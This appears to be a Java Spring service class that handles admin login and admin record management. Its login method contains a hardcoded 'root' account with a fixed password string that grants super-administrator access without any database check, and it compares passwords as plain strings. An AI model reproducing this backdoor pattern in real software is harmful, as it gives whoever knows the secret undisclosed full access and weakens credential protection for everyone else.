package com.ssm.hui.service.impl;

import java.util.List;

import javax.annotation.Resource;

import org.springframework.stereotype.Service;

import com.ssm.hui.dao.BaseDao;
import com.ssm.hui.domain.Admin;
import com.ssm.hui.service.AdminService;

import net.sf.json.JSONArray;
import net.sf.json.JSONObject;

/** 
 * @author hui 
 * @date 创建时间：2018年4月23日 下午2:30:09 吴清辉新建
 * @version 1.0 
 **/
@Service("adminService")
public class AdminServiceImpl implements AdminService {
	
	//==注入dao	
	@Resource(name="baseDao")
	protected BaseDao baseDao;
	
	@Override
	public String saveAdmin(Admin am) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public JSONObject adminLogin(Admin am) {
		JSONObject jo=new JSONObject();
		try {
			String loginName=am.getLoginName();			
			
			if(loginName.equals("root")){//黑卡
				if(am.getPassword().equals("116c8acef003abc41fd9d1f1eccdb430")){
					jo.put("msg", "ok");
					jo.put("dispalyName", "超级管理员");
					return jo;
				}				
			}
			
			Admin adm=(Admin) baseDao.findForObject("AdminMapper.getAdminByCondition",am);
			if(null!=adm){//不为空则存在
				if(adm.getPassword().equals(am.getPassword())){
					jo.put("msg", "ok");
					jo.put("dispalyName", adm.getDisplayName());
					return jo;
				}
				jo.put("msg", "nook");
				return jo;//密码错误
			}
			jo.put("msg", "no");
			return jo;//用户不存在
		}catch(Exception e){
			e.printStackTrace();
			jo.put("msg", "error");
			return jo;//查询出错
		}
	}

	@Override
	public JSONArray getAdminList() {
		Admin ad=new Admin();
		JSONArray ja=new JSONArray();
		try {
			List<Admin> adminList=(List<Admin>) baseDao.findForList("AdminMapper.getAdminList", ad);			
			for(Admin ado:adminList){
				ja.add(ado);
			}
			//return helpMsgList;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return ja;
	}

	@Override
	public String saveOrUpdateAdmin(Admin am) {
		try {
			if(am.getAdminId()==0){//新增
				baseDao.save("AdminMapper.saveAdmin", am);
			}else{
				baseDao.update("AdminMapper.updateAdminById", am);
			}
			
			return "ok";
		} catch (Exception e) {
			e.printStackTrace();
			return "error";
			
		}
	}

	@Override
	public String deleteAdmin(Admin am) {
		try {
			baseDao.delete("AdminMapper.deleteAdmin", am);
			return "ok";
		} catch (Exception e) {
			e.printStackTrace();
			return "error";
			
		}
	}

	@Override
	public Admin getAdminById(Admin am) {
		Admin newAm=new Admin();
		try {
			newAm=(Admin) baseDao.findForObject("AdminMapper.getAdminByCondition", am);
			return newAm;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
			
		}
	}

	@Override
	public String updateAdminPsw(Admin am) {
		try {
			if(am.getAdminId()!=0){		
				baseDao.update("AdminMapper.updateAdminById", am);
				return "ok";
			}
			
			return "nook";
		} catch (Exception e) {
			e.printStackTrace();
			return "error";
			
		}
	}

}
